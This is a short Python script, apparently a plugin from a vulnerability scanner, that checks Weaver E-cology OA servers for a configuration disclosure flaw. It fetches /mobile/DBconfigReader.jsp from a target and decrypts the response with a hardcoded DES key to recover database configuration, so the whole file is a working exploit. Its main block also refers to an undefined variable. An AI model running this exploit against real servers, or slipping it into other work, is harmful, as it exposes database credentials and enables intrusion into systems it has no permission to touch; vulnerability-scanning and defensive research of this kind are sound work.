#/usr/bin/python3

'''
name: 泛微-OA漏洞
description: 泛微-OA Config信息泄露漏洞
'''

import json
import pyDes
import urllib3
from app.lib.utils.request import request


class Weaver_Ecology_Oa_Config_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0",
        }

    def run(self):
        try:
            url = self.url + "/mobile/DBconfigReader.jsp"
            check_req = request.get(url, headers = self.headers)
            if check_req.status_code == 200:
                cipherX = pyDes.des('        ')
                cipherX.setKey('1z2x3c4v5b6n')
                result = cipherX.decrypt(check_req.content.strip()).strip().decode('utf-8')
                print("存在泛微config信息泄露漏洞")
                return True
            else:
                #print("%s不存在泛微config信息泄露漏洞" %(url))
                return False
        except Exception as e:
            #print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    Weaver_Ecology_OA_Config = Weaver_Ecology_Oa_Config_BaseVerify(ip.strip())
    Weaver_Ecology_OA_Config.run()